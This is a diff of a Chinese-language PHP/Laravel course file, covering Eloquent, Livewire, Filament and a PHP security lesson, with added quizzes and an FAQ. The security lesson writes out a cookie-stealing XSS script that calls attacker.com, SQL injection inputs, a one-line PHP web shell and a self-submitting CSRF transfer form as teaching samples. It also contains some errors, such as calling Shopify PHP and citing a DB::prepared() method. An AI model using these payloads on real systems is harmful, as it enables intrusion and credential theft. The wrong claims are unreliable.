'email|unique:users,email,' . $id,\n        ]));\n        return response()->json($user);\n    }\n    \n    // 刪除使用者\n    public function destroy($id) {\n        $user = User::findOrFail($id);\n        $user->delete();\n        return response()->json(['message' => 'User deleted']);\n    }\n}\n```\n\n**validate() 在做什麼？**\n- `required`：必填\n- `string`：必須是字串\n- `max:255`：最多 255 字符\n- `email`：必須是有效的電郵格式\n- `unique:users`：在 users 表中必須唯一（沒有重複）\n\n這樣一行程式碼，Laravel 自動幫你檢查、拒絕不合規的資料。\n\n### Eloquent Model——「把資料庫當成物件來用」\n\n這是 Laravel 最強的地方。不用寫 SQL，直接操作 PHP 物件。\n\n🖥️\n```bash\nphp artisan make:model User\n```\n\n📄 `app/Models/User.php`\n```php\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass User extends Model\n{\n    // 這些欄位可以被大量賦值（mass assignment）\n    protected $fillable = ['name', 'email', 'password'];\n    \n    // 隱藏敏感欄位（轉換成 JSON 時不會露出來）\n    protected $hidden = ['password'];\n    \n    // 一個使用者有很多篇文章\n    public function posts() {\n        return $this->hasMany(Post::class);\n    }\n    \n    // 一個使用者屬於一個公司\n    public function company() {\n        return $this->belongsTo(Company::class);\n    }\n}\n```\n\n**怎麼用？**\n\n📄\n```php\n// 新增\n$user = User::create([\n    'name' => 'Alice',\n    'email' => 'alice@example.com',\n    'password' => bcrypt('secret123'),\n]);\n\n// 查詢\n$user = User::find(1);                        // 用 ID 找\n$user = User::where('email', 'alice@example.com')->first();  // 條件查詢\n$users = User::all();                         // 所有使用者\n$users = User::where('active', 1)->get();     // 多個符合條件的\n\n// 更新\n$user->update(['name' => 'Alice Smith']);\n$user->name = 'Alice Smith';\n$user->save();\n\n// 刪除\n$user->delete();\nUser::where('created_at', '<', '2020-01-01')->delete();  // 批量刪除\n\n// 關係\n$user = User::find(1);\n$posts = $user->posts;  // 自動執行 JOIN，取出這個使用者的所有文章\n```\n\n**為什麼叫 Eloquent？**\nEloquent（雄辯的）——意思是讓你用「雄辯」的 PHP 代碼表達複雜的資料庫邏輯。\n\n### Migration（遷移）——版本控制你的資料庫\n\n想像 Migration 是資料庫的 Git 版本控制。每當你要改表結構，就寫一個 Migration，然後 Laravel 幫你自動執行。\n\n🖥️\n```bash\nphp artisan make:migration create_users_table\n```\n\n這會產生一個時間戳檔案，例如 `2024_01_15_120000_create_users_table.php`。\n\n📄\n```php\nuse Illuminate\\Database\\Migrations\\Migration;\nuse Illuminate\\Database\\Schema\\Blueprint;\nuse Illuminate\\Support\\Facades\\Schema;\n\nreturn new class extends Migration\n{\n    // 向前執行（建立表）\n    public function up()\n    {\n        Schema::create('users', function (Blueprint $table) {\n            $table->id();                           // 自增主鍵\n            $table->string('name');                 // VARCHAR(255)\n            $table->string('email')->unique();      // 不重複的電郵\n            $table->timestamp('email_verified_at')->nullable();",
       "tip": {
         "type": "practical",
         "text": "Laravel 約定優於設定，照它的目錄結構走能省很多力；artisan 指令能生大半樣板、別手刻。"
@@ -354,13 +423,36 @@
           "level": 2,
           "text": "心法"
         }
-      ]
+      ],
+      "miniQuiz": {
+        "question": "根據這堂課的內容，Laravel 最主要的優勢是什麼？",
+        "options": [
+          {
+            "value": "a",
+            "label": "PHP 是全球最多人用的程式語言，所以 Laravel 自動很強大"
+          },
+          {
+            "value": "b",
+            "label": "Laravel 讓 PHP 開發變現代化且優雅，能快速完成專案，特別適合接案和中型 SaaS"
+          },
+          {
+            "value": "c",
+            "label": "Laravel 可以完全取代 WordPress，成為所有網站的標準框架"
+          },
+          {
+            "value": "d",
+            "label": "Laravel 內建了 Queue、Scheduler、Auth 等功能，所以不需要學習其他技術"
+          }
+        ],
+        "answer": "b",
+        "explanation": "課程的核心心法就是：Laravel 讓 PHP 現代化，適合接案和 SaaS 開發，5 倍速度完成事情。選項 a 是說法不夠精準、c 是誤解課程（WordPress 仍主流但 Laravel 接案更賺）、d 只列舉功能但沒抓到 Laravel 真正的價值定位。"
+      }
     },
     {
       "title": "Laravel 進階：Livewire + Filament + 部署",
       "oneLineSummary": "不寫 JS 也能做互動 UI",
       "analogy": "加速 SaaS 開發。",
-      "content": "## Livewire（不寫 JS）\n\nPHP 全棧、像 Blazor：\n\n```php\n// app/Livewire/Counter.php\nclass Counter extends Component\n{\n    public $count = 0;\n    \n    public function increment() {\n        $this->count++;\n    }\n    \n    public function render() {\n        return view('livewire.counter');\n    }\n}\n```\n\n```blade\n<!-- resources/views/livewire/counter.blade.php -->\n<div>\n    Count: {{ $count }}\n    <button wire:click=\"increment\">+</button>\n</div>\n```\n\n點按鈕 → AJAX → 後端 increment → 自動更新 UI、不寫 JS。\n\n## Filament（後台神器）\n\n```bash\ncomposer require filament/filament\nphp artisan filament:install --panels\n```\n\n定義 Resource：\n```php\nclass UserResource extends Resource\n{\n    public static function form(Form $form): Form\n    {\n        return $form->schema([\n            TextInput::make('name')->required(),\n            TextInput::make('email')->email(),\n        ]);\n    }\n    \n    public static function table(Table $table): Table\n    {\n        return $table->columns([\n            TextColumn::make('name'),\n            TextColumn::make('email'),\n        ]);\n    }\n}\n```\n\n**5 分鐘有完整 admin UI**：CRUD / search / filter / export 全自動。\n\n## 部署選擇\n\n### Laravel Forge\n- $19/月 起\n- 一鍵部署\n- DigitalOcean / AWS / Linode\n- Laravel 友善\n\n### Laravel Vapor\n- AWS serverless\n- 自動 scale\n- $39/月 起\n\n### Ploi.io\n- Forge 替代\n- 便宜\n\n### 自架\n- Nginx + PHP-FPM\n- 麻煩、但便宜\n\n### 共享主機（Bluehost）\n- 適合：學習 / WordPress\n- 不適合：Laravel 認真做\n\n### Cloudways / DigitalOcean 1-click\n- 中價、簡單\n\n## 性能優化\n\n### OPcache（必開）\n```ini\nopcache.enable=1\nopcache.memory_consumption=256\n```\n\n### Route cache\n```bash\nphp artisan route:cache\nphp artisan config:cache\nphp artisan view:cache\n```\n\n### Octane（10x performance）\n```bash\nphp artisan octane:install\nphp artisan octane:start --server=swoole\n```\n\nPHP 不退、保 hot state。\n\n## 心法\n- Filament = 5 分鐘 admin\n- Livewire = 不寫 JS 全棧\n- Laravel Forge = 5 分鐘部署\n- Indie 接案：Laravel + Filament 神組合\n\n**☕ 用人話講**\n\nLaravel 進階：Livewire + Filament + 部署——**不寫 JS 也能做出互動 UI**。**一句話記住**：像不用學新語言就能做互動——Livewire 讓你純 PHP 做出動態介面、Filament 快速生出漂亮後台。\n",
+      "content": "## Livewire（不寫 JS）—— PHP 全棧互動介面\n\n### 什麼是 Livewire？\n\nLivewire 是一個 Laravel 框架上的套件，讓你**用 PHP 寫互動式元件、不用碰 JavaScript**。它的運作原理是這樣的：\n\n當使用者在頁面上點按鈕或輸入文字時，Livewire 會自動用 AJAX（非同步請求）把操作送到後端 PHP、執行邏輯、然後只更新有變化的 HTML 部分，再送回前端重新渲染。聽起來複雜，但對開發者來說就像寫一般的 PHP class 一樣簡單——**你根本感覺不到 JS 的存在**。\n\n這個概念有點像微軟的 Blazor（用 C# 寫互動 UI）、只是 Livewire 是 PHP 版本。\n\n### 快速上手：計數器例子\n\n首先安裝：\n\n🖥️ \n```bash\ncomposer require livewire/livewire\n```\n\n建立一個 Livewire component：\n\n🖥️ \n```bash\nphp artisan make:livewire Counter\n```\n\n這會生成兩個檔案。先看 **PHP class**：\n\n📄 `app/Livewire/Counter.php`\n```php\n<?php\n\nnamespace App\\Livewire;\n\nuse Livewire\\Component;\n\nclass Counter extends Component\n{\n    // 公開屬性 = UI 會綁定的資料\n    public $count = 0;\n    \n    // 用戶點按鈕時會呼叫這個方法\n    public function increment()\n    {\n        $this->count++;\n    }\n    \n    // 這是必要的、告訴 Livewire 要顯示哪個 view\n    public function render()\n    {\n        return view('livewire.counter');\n    }\n}\n```\n\n再看 **HTML 樣板**：\n\n📄 `resources/views/livewire/counter.blade.php`\n```blade\n<div>\n    <h2>計數器</h2>\n    <p>目前數字：{{ $count }}</p>\n    <button wire:click=\"increment\">+1</button>\n</div>\n```\n\n在頁面上引用它：\n\n📄 `resources/views/dashboard.blade.php`\n```blade\n<h1>我的儀表板</h1>\n\n@livewire('counter')\n```\n\n**就這樣**——當使用者點「+1」按鈕時：\n\n1. `wire:click=\"increment\"` 攔截點擊事件\n2. 發 AJAX 要求到後端\n3. `increment()` 方法執行，`$count++`\n4. 只有包含 `$count` 的 HTML 重新渲染並送回\n5. 前端動畫更新（預設有漂亮淡入淡出）\n\n使用者看到數字變了，**沒有寫一行 JavaScript**。\n\n### 更實際的例子：待辦清單\n\n讓我們來做個更有用的東西：\n\n📄 `app/Livewire/TodoList.php`\n```php\n<?php\n\nnamespace App\\Livewire;\n\nuse Livewire\\Component;\n\nclass TodoList extends Component\n{\n    // 待辦事項清單\n    public $todos = [];\n    \n    // 新增的輸入框\n    public $newTodo = '';\n    \n    // 初始化時從資料庫載入（或寫死測試資料）\n    public function mount()\n    {\n        $this->todos = [\n            ['id' => 1, 'text' => '學 Laravel', 'done' => false],\n            ['id' => 2, 'text' => '學 Livewire', 'done' => true],\n        ];\n    }\n    \n    // 新增一筆\n    public function addTodo()\n    {\n        if (trim($this->newTodo) === '') {\n            return; // 空值不新增\n        }\n        \n        $this->todos[] = [\n            'id' => count($this->todos) + 1,\n            'text' => $this->newTodo,\n            'done' => false,\n        ];\n        \n        $this->newTodo = ''; // 清空輸入框\n    }\n    \n    // 標記完成\n    public function toggleTodo($id)\n    {\n        foreach ($this->todos as &$todo) {\n            if ($todo['id'] === $id) {\n                $todo['done'] = !$todo['done'];\n                break;\n            }\n        }\n    }\n    \n    // 刪除\n    public function deleteTodo($id)\n    {\n        $this->todos = array_filter(\n            $this->todos,\n            fn($todo) => $todo['id'] !== $id\n        );\n    }\n    \n    public function render()\n    {\n        return view('livewire.todo-list');\n    }\n}\n```\n\n📄 `resources/views/livewire/todo-list.blade.php`\n```blade\n<div class=\"todo-container\">\n    <h2>我的待辦清單</h2>\n    \n    <!-- 新增表單 -->\n    <div class=\"add-todo\">\n        <input \n            type=\"text\" \n            wire:model=\"newTodo\" \n            wire:keydown.enter=\"addTodo\"\n            placeholder=\"輸入新待辦事項...\"\n        >\n        <button wire:click=\"addTodo\">新增</button>\n    </div>\n    \n    <!-- 清單 -->\n    <ul>\n        @forelse($todos as $todo)\n            <li class=\"{{ $todo['done'] ? 'done' : '' }}\">\n                <input \n                    type=\"checkbox\" \n                    {{ $todo['done'] ? 'checked' : '' }}\n                    wire:click=\"toggleTodo({{ $todo['id'] }})\"\n                >\n                <span>{{ $todo['text'] }}</span>\n                <button \n                    wire:click=\"deleteTodo({{ $todo['id'] }})\"\n                    class=\"delete-btn\"\n                >\n                    ✕\n                </button>\n            </li>\n        @empty\n            <li class=\"empty\">沒有待辦事項</li>\n        @endforelse\n    </ul>\n</div>\n\n<style>\n    .done { text-decoration: line-through; color: #999; }\n    .delete-btn { background: #ff4444; color: white; border: none; padding: 4px 8px; }\n</style>\n```\n\n看到 `wire:model=\"newTodo\"` 了嗎？這是**雙向綁定**——輸入框的值自動同步到 PHP 變數，反之亦然。`wire:keydown.enter=\"addTodo\"` 代表按 Enter 鍵時呼叫 `addTodo()` 方法。\n\n### Livewire 常見雷點\n\n1. **忘記公開屬性**——只有標記為 `public` 的屬性才會綁定到 view。私有屬性前端看不到。\n\n2. **陣列裡的物件變不了**——如果你改了 `$todos[0]['text']`，Livewire 可能偵測不到。**建議用強制更新**：\n   ```php\n   $this->todos = $this->todos; // 強制觸發重新渲染\n   ```\n\n3. **大量資料會變慢**——Livewire 每次都要序列化所有公開屬性、傳回前端。如果清單有 1000 筆，會變卡。**解法**：用虛擬滾動、分頁、或改用 Alpine.js 搭配。\n\n4. **安全性**——前端可以看到你的元件名稱和屬性名，但看不到值。還是要在後端驗證。\n\n---\n\n## Filament（後台神器）—— 5 分鐘生出 Admin 後台\n\n### 什麼是 Filament？\n\nFilament 是一個**為 Laravel 設計的 Admin Panel 產生器**。簡單說：你定義一個資源（像「使用者」、「文章」），Filament 就自動幫你產生一個漂亮、完整的後台頁面——包含列表、搜尋、篩選、CRUD、匯出 CSV，**全部不用寫 HTML**。\n\n它就像一個自動化工廠：你餵進去「我要管理使用者」的定義，工廠吐出一個完整的後台介面。\n\n### 安裝和初始化\n\n🖥️ \n```bash\ncomposer require filament/filament\n\nphp artisan filament:install --panels\n```\n\n這會建立一個 `Admin` panel。然後為你的模型建立 Resource：\n\n🖥️ \n```bash\nphp artisan make:filament-resource User\n```\n\n生成的檔案長這樣：\n\n📄 `app/Filament/Resources/UserResource.php`\n```php\n<?php\n\nnamespace App\\Filament\\Resources;\n\nuse App\\Models\\User;\nuse Filament\\Forms;\nuse Filament\\Forms\\Form;\nuse Filament\\Resources\\Resource;\nuse Filament\\Tables;\nuse Filament\\Tables\\Table;\n\nclass UserResource extends Resource\n{\n    protected static ?string $model = User::class;\n    \n    // 這裡定義新增 / 編輯表單\n    public static function form(Form $form): Form\n    {\n        return $form\n            ->schema([\n                Forms\\Components\\TextInput::make('name')\n                    ->required()\n                    ->maxLength(255),\n                \n                Forms\\Components\\TextInput::make('email')\n                    ->email()\n                    ->required()\n                    ->maxLength(255),\n                \n                Forms\\Components\\TextInput::make('password')\n                    ->password()\n                    ->minLength(8)\n                    ->dehydrateStateUsing(fn ($state) => bcrypt($state))\n                    ->required(fn (string $context) => $context === 'create'),\n            ]);\n    }\n    \n    // 這裡定義列表表格\n    public static function table(Table $table): Table\n    {\n        return $table\n            ->columns([\n                Tables\\Columns\\TextColumn::make('id')\n                    ->label('ID')\n                    ->sortable(),\n                \n                Tables\\Columns\\TextColumn::make('name')\n                    ->label('姓名')\n                    ->searchable(),\n                \n                Tables\\Columns\\TextColumn::make('email')\n                    ->label('信箱')\n                    ->searchable(),\n                \n                Tables\\Columns\\TextColumn::make('created_at')\n                    ->label('建立時間')\n                    ->dateTime('Y-m-d H:i')\n                    ->sortable(),\n            ])\n            ->filters([\n                // 這裡可以加篩選器\n            ])\n            ->actions([\n                Tables\\Actions\\EditAction::make(),\n                Tables\\Actions\\DeleteAction::make(),\n            ])\n            ->bulkActions([\n                Tables\\Actions\\BulkActionGroup::make([\n                    Tables\\Actions",
       "tip": {
         "type": "practical",
         "text": "Livewire / Filament 讓你少寫前端就有互動後台；但複雜互動還是該交給專門前端、別硬撐。"
@@ -439,13 +531,36 @@
           "level": 2,
           "text": "心法"
         }
-      ]
+      ],
+      "miniQuiz": {
+        "question": "根據這堂課的內容，Livewire 最核心的優勢是什麼？",
+        "options": [
+          {
+            "value": "a",
+            "label": "讓你用 PHP 寫互動式 UI，不需要寫 JavaScript"
+          },
+          {
+            "value": "b",
+            "label": "自動生成完整的後台管理系統，包含 CRUD 功能"
+          },
+          {
+            "value": "c",
+            "label": "提供一鍵部署的功能，支援多個雲端平台"
+          },
+          {
+            "value": "d",
+            "label": "提升 PHP 執行效能到 10 倍，使用 Swoole 引擎"
+          }
+        ],
+        "answer": "a",
+        "explanation": "Livewire 的核心特色就是讓開發者用純 PHP 寫全棧應用，點擊按鈕自動 AJAX 後端更新、不用寫 JS。自動生成後台是 Filament 的功能、一鍵部署是 Forge 的功能、10 倍效能提升是 Octane 的功能。"
+      }
     },
     {
       "title": "PHP 安全 + 反 pattern",
       "oneLineSummary": "老 PHP 一堆坑、新代碼別重蹈",
       "analogy": "SQL injection / XSS / RCE 大宗。",
-      "content": "## PHP 常見漏洞\n\n### SQL Injection\n```php\n// ❌\n$user = mysqli_query($db, \"SELECT * FROM users WHERE id = $_GET[id]\");\n\n// ✅ Prepared statement\n$stmt = $db->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->bind_param(\"i\", $_GET['id']);\n\n// ✅ Laravel Eloquent（自動處理）\nUser::find($request->id);\n```\n\n### XSS\n```php\n// ❌\necho \"Welcome, $_GET[name]\";\n\n// ✅\necho htmlspecialchars($_GET['name']);\n\n// ✅ Blade（自動 escape）\n{{ $name }}\n\n// ❌ Blade 不 escape\n{!! $name !!}  // 只用於信任的 HTML\n```\n\n### CSRF\n```html\n<!-- Laravel 自動 -->\n<form method=\"POST\">\n  @csrf  <!-- 加 hidden token -->\n  ...\n</form>\n```\n\n### File Upload\n```php\n// ❌ 信任 client extension\nmove_uploaded_file($_FILES['file']['tmp_name'], \"uploads/\" . $_FILES['file']['name']);\n\n// ✅ 檢查 MIME + size + rename\n$file = $request->file('photo');\n$valid = $file->isValid() && $file->getMimeType() === 'image/jpeg';\nif (!$valid) abort(400);\n$name = Str::random(40) . '.' . $file->extension();\n$file->storeAs('uploads', $name);\n```\n\n### RCE（Remote Code Execution）\n```php\n// ❌❌❌ 永遠不要\neval($_GET['code']);\ninclude $_GET['file'];\nsystem($_GET['cmd']);\n\n// ❌ unserialize() 也危險\nunserialize($_POST['data']);\n```\n\n## .env / 密鑰\n\n### 不要 commit\n```\n.env           # ✓ .gitignore\n.env.example   # ✓ 可 commit（無 value）\n```\n\n### 不要在 production 暴露\n```php\n// ❌ APP_DEBUG=true production\n// 出錯時顯示完整 stack trace + .env content\n```\n\n## SQL 慢查 + N+1\n```php\n// ❌ N+1\n$users = User::all();\nforeach ($users as $user) {\n    echo $user->posts->count();  // 每個 user 多 1 query\n}\n\n// ✅ Eager loading\n$users = User::with('posts')->get();\n```\n\n## 常見災難（老 PHP）\n\n### 1. register_globals\nPHP 4 時代、`$_GET[user]` 變 `$user`。\n完全災難、PHP 5.4+ 移除。\n\n### 2. magic_quotes\n自動 escape 但有 bug。\nPHP 5.4+ 移除。\n\n### 3. 全域變數\n舊 code 大量用、難 debug。\n\n### 4. eval / preg_replace 含 e modifier\n動態 execute、災難。\n\n## 升級 PHP\n\n### 從舊 PHP 升 8.x\n- 性能 +2-5x\n- 新語法（typed properties / enum）\n- 安全修補\n\n舊 code 不升 = 找死。\n\n## 心法\n- 用 Laravel = 99% 自動防護\n- 不要直接寫 PHP（裸寫）\n- prepared statement 永遠用\n- escape output 永遠做\n- .env 鎖好\n- APP_DEBUG=false production\n- PHP 8.x+\n\n**☕ 用人話講**\n\nPHP 安全 + 反 pattern——**老 PHP 有一堆坑，新代碼別重蹈覆轍**。**一句話記住**：像一張「前人踩過的雷區地圖」——老 PHP 的壞習慣別學，照現代寫法走，才寫得安全又好維護。\n",
+      "content": "## PHP 安全 + 反 pattern\n\n### 一開始：為什麼 PHP 安全這麼重要？\n\nPHP 是全世界最多網站用的後端語言，WordPress、Drupal、Magento 都靠它。但這也代表「駭客特別喜歡攻擊 PHP」。一個小漏洞，攻擊者可能盜走全部會員資料、刪掉整個數據庫、甚至在你伺服器上執行任意程式碼。這不是危言聳聽——每年幾千個網站被駭就是這樣來的。\n\n所以這課不是「為了考試」，是「為了不被駭」。\n\n---\n\n## SQL Injection（資料庫注入）\n\n### 問題：攻擊者直接修改 SQL 指令\n\n想像你寫了這行：\n\n```php\n// ❌ 最危險的寫法\n$user_id = $_GET['id'];\n$result = mysqli_query($db, \"SELECT * FROM users WHERE id = $user_id\");\n```\n\n表面上很無害，但如果攻擊者造訪這個網址：\n\n```\nhttps://example.com/user.php?id=1 OR 1=1\n```\n\n實際執行的 SQL 就變成：\n\n```sql\nSELECT * FROM users WHERE id = 1 OR 1=1\n```\n\n`1=1` 永遠為真，所以會回傳**全部**用戶資料。攻擊者還可以用更惡毒的指令，比如 `id=1; DROP TABLE users;--` 直接刪掉整個表。\n\n### 解法 1：Prepared Statement（預備陳述式）\n\n這是最保險的方法——**先告訴資料庫要執行什麼指令的框架，再另外傳參數進去**，資料庫會自動確保參數不會被當成程式碼執行：\n\n```php\n// ✅ 用 mysqli\n$stmt = $db->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->bind_param(\"i\", $_GET['id']);  // \"i\" = integer 型別\n$stmt->execute();\n$result = $stmt->get_result();\n\n// 或用 PDO（更現代）\n$stmt = $db->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$_GET['id']]);\n$result = $stmt->fetchAll();\n```\n\n重點是那個 `?` —— 它就像一個「安全的洞」，資料庫知道這裡只放數據、不解析指令。\n\n### 解法 2：Laravel Eloquent（最懶的方法）\n\n如果你用 Laravel，根本不用自己寫 SQL：\n\n```php\n// ✅ Laravel 自動幫你用 prepared statement\n$user = User::find($request->id);\n\n// 或\n$user = User::where('email', $request->email)->first();\n```\n\nLaravel 的 Eloquent ORM（Object-Relational Mapping —— 把資料庫表當物件來用）自動防 SQL injection，你只要把邏輯寫對就行。\n\n⚠️ **但這不代表隨便寫 SQL 就安全**——如果非得用原生 SQL，一樣要用 `DB::prepared()`：\n\n```php\n// ❌ 不安全\n$user = DB::select(DB::raw(\"SELECT * FROM users WHERE id = \" . $request->id));\n\n// ✅ 用參數綁定\n$user = DB::select(\"SELECT * FROM users WHERE id = ?\", [$request->id]);\n```\n\n---\n\n## XSS（跨站腳本）\n\n### 問題：攻擊者在你網頁上執行 JavaScript\n\n假設你的網站有個留言板：\n\n```php\n// ❌ 直接輸出用戶輸入\n$comment = $_POST['comment'];\necho \"用戶說：$comment\";\n```\n\n攻擊者發了這個「留言」：\n\n```html\n<script>\n  // 竊取訪客的 cookie（裡面可能有登入憑證）\n  fetch('https://attacker.com/steal?cookie=' + document.cookie);\n</script>\n```\n\n每個看留言的人，JavaScript 都會自動執行，攻擊者就偷到所有人的登入狀態。\n\n### 解法 1：htmlspecialchars() / htmlentities()\n\n把可能有問題的字符轉成「安全的 HTML 實體」：\n\n```php\n// ✅ 轉換成 &lt; &gt; 之類的，瀏覽器看得到字但不執行代碼\necho htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');\n\n// 結果：用戶看到的是原文，但 <script> 不會執行\n```\n\n這樣用戶發的 `<script>` 會被顯示成純文本「`<script>`」，不會被瀏覽器當成代碼執行。\n\n### 解法 2：Laravel Blade 樑板（最自動的）\n\nLaravel 的 Blade 樑板引擎預設會自動 escape：\n\n```blade\n<!-- ✅ 自動 escape，安全 -->\n{{ $user_comment }}\n\n<!-- 輸出：&lt;script&gt;... 這樣的 HTML entities -->\n```\n\n但有時你**真的**需要輸出 HTML（比如從資料庫存的富文本編輯器內容）——這時要特別小心，用雙花括號打開：\n\n```blade\n<!-- ❌ 危險，直接輸出原始 HTML -->\n{!! $editor_content !!}\n\n<!-- 只在你 100% 確定內容安全時用 -->\n```\n\n⚠️ **常見雷**：剛開始寫 Laravel 的人常以為 `{!! !!}` 是「更高級的語法」，亂用在用戶輸入上——千萬別這樣！\n\n---\n\n## CSRF（跨站偽造請求）\n\n### 問題：攻擊者冒充你傳送動作\n\n假設你登入了銀行網站，然後不小心在另一個分頁打開了攻擊者的網站。那個網站有個隱藏的表單：\n\n```html\n<!-- 用戶看不到這個，自動提交 -->\n<form action=\"https://bank.com/transfer\" method=\"POST\">\n  <input name=\"to_account\" value=\"attacker_account\">\n  <input name=\"amount\" value=\"10000\">\n</form>\n<script>\n  document.forms[0].submit();  // 自動送出\n</script>\n```\n\n因為你還登著銀行網站，你的 cookie 會跟著送過去，銀行伺服器以為是你的真實操作，就轉帳了。\n\n### 解法：CSRF Token（跨站偽造請求令牌）\n\nLaravel 自動幫你防——每個表單都要夾一個特殊的 token，只有真正的用戶頁面才有：\n\n```blade\n<!-- 在 Laravel 表單裡 -->\n<form method=\"POST\" action=\"/transfer\">\n  @csrf  <!-- Laravel 自動加 hidden token field -->\n  <input name=\"to_account\">\n  <input name=\"amount\">\n  <button>轉帳</button>\n</form>\n```\n\nLaravel 會產生一個只有這個用戶知道的 token、放在隱藏欄位裡。攻擊者的假網站不知道 token 是什麼，所以偽造的請求會被拒絕。\n\n如果用 AJAX：\n\n```javascript\n// 自動帶上 CSRF token\nfetch('/api/transfer', {\n  method: 'POST',\n  headers: {\n    'X-CSRF-TOKEN': document.querySelector('meta[name=\"csrf-token\"]').content\n  },\n  body: JSON.stringify({to_account: 'xxx', amount: 1000})\n});\n```\n\n---\n\n## 檔案上傳漏洞\n\n### 問題：用戶上傳的檔案可能是毒藥\n\n很多網站都有「頭像上傳」或「檔案分享」功能。如果寫得隨便，攻擊者可能：\n\n1. **上傳可執行檔** —— 伺服器直接執行病毒\n2. **上傳超大檔案** —— 讓伺服器儲存空間爆滿\n3. **上傳惡意 PHP** —— 比如 `<?php system($_GET['cmd']); ?>` 直接控制伺服器\n\n```php\n// ❌ 最危險的寫法\n$filename = $_FILES['photo']['name'];  // \"hack.php.jpg\"\nmove_uploaded_file($_FILES['photo']['tmp_name'], \"uploads/$filename\");\n// 現在伺服器上有個可執行的 PHP 檔\n```\n\n### 解法：檔案驗證 + 重新命名\n\n```php\n// ✅ 用 Laravel 安全上傳\n$file = $request->file('photo');\n\n// 1. 檢查檔案是否有效\nif (!$file->isValid()) {\n    abort(400, '檔案無效');\n}\n\n// 2. 檢查 MIME type（檔案真實格式，不是副檔名）\n$mimeType = $file->getMimeType();\nif (!in_array($mimeType, ['image/jpeg', 'image/png', 'image/gif'])) {\n    abort(400, '只接受圖片');\n}\n\n// 3. 檢查檔案大小\nif ($file->getSize() > 5 * 1024 * 1024) {  // 5MB\n    abort(400, '檔案太大');\n}\n\n// 4. 重新命名（不用原本的名字）\n$name = Str::random(40) . '.' . $file->extension();\n\n// 5. 存到 public 目錄外的安全位置\n$file->storeAs('public/uploads', $name);\n```\n\n**關鍵點**：\n\n- **不信任副檔名** —— 攻擊者可以把 `.php` 改成 `.jpg`\n- **檢查 MIME type** —— 但 MIME type 也可能被偽造，所以還要用圖片函式庫驗證圖片真實性\n- **重新命名** —— 用隨機字串，這樣攻擊者不知道檔案叫什麼名字\n- **存在程式碼以外的地方** —— 用 `.env` 設定個目錄，最好不是 public 資料夾\n\n```php\n// 更安全的做法：用 PHP 圖片驗證\nif (!getimagesize($file->getRealPath())) {\n    abort(400, '這不是真正的圖片');\n}\n```\n\n---\n\n## RCE（Remote Code Execution ——",
       "tip": {
         "type": "security",
         "text": "舊 PHP 是漏洞庫、升 8.x + Laravel 一勞永逸。"
@@ -540,7 +655,30 @@
           "level": 2,
           "text": "心法"
         }
-      ]
+      ],
+      "miniQuiz": {
+        "question": "你在 Laravel 專案寫了一個表單，要讓使用者輸入名字然後顯示。下面哪個做法最安全？",
+        "options": [
+          {
+            "value": "a",
+            "label": "用 {{ $name }} 在 Blade 模板中顯示，Laravel 會自動防護 XSS"
+          },
+          {
+            "value": "b",
+            "label": "用 {!! $name !!} 在 Blade 中顯示，這樣最快"
+          },
+          {
+            "value": "c",
+            "label": "直接在 PHP 中 echo $_GET['name']，簡單直接"
+          },
+          {
+            "value": "d",
+            "label": "用 eval() 來動態處理使用者輸入的名字"
+          }
+        ],
+        "answer": "a",
+        "explanation": "{{ }} 是 Blade 的自動 escape 語法，會自動呼叫 htmlspecialchars() 防護 XSS；{!! !!} 不 escape（只用於信任的 HTML）；直接 echo $_GET 會被注入；eval() 是遠端代碼執行漏洞，絕對禁用。"
+      }
     }
   ],
   "boss": {
@@ -554,5 +692,26 @@
     "questions": [],
     "xpReward": 50,
     "perfectBonus": 50
-  }
+  },
+  "summary": [
+    "PHP 佔全網站 77% 市佔，不管走技術還是接案都繞不過去",
+    "Laravel 是現代 PHP 框架裡最好上手、生態最完整的選擇",
+    "Eloquent ORM 讓你用物件導向的方式操作資料庫，不用寫 SQL",
+    "Livewire + Filament 讓你快速打造後台管理系統，直接能接案賺錢",
+    "安全漏洞、SQL injection、XSS 不是選修題，是每個 PHP 工程師必備防火牆"
+  ],
+  "faq": [
+    {
+      "q": "PHP 已經這麼舊了，為什麼還要學？",
+      "a": "因為全世界 77% 的網站用 PHP，WordPress、Shopify、Magento 也都是 PHP 寫的。不管是維護老專案還是接案改網站，PHP 都是最大的市場。而且現代 PHP 不臭，Laravel 寫起來其實很舒服。"
+    },
+    {
+      "q": "一定要學 Laravel，還是可以直接寫原生 PHP？",
+      "a": "可以直接寫，但會很累。Laravel 幫你省掉 80% 重複的工作——路由、資料庫、驗證、登入都內建。對接案或找工作來說，會框架比會原生 PHP 更值錢。"
+    },
+    {
+      "q": "學完能直接接案改網站嗎？",
+      "a": "能看懂且改簡單的功能，複雜的改裝還是要看經驗和案子難度。但把這章全學完，你已經具備接小案的基本功力了，其他就靠實戰磨。"
+    }
+  ]
 }
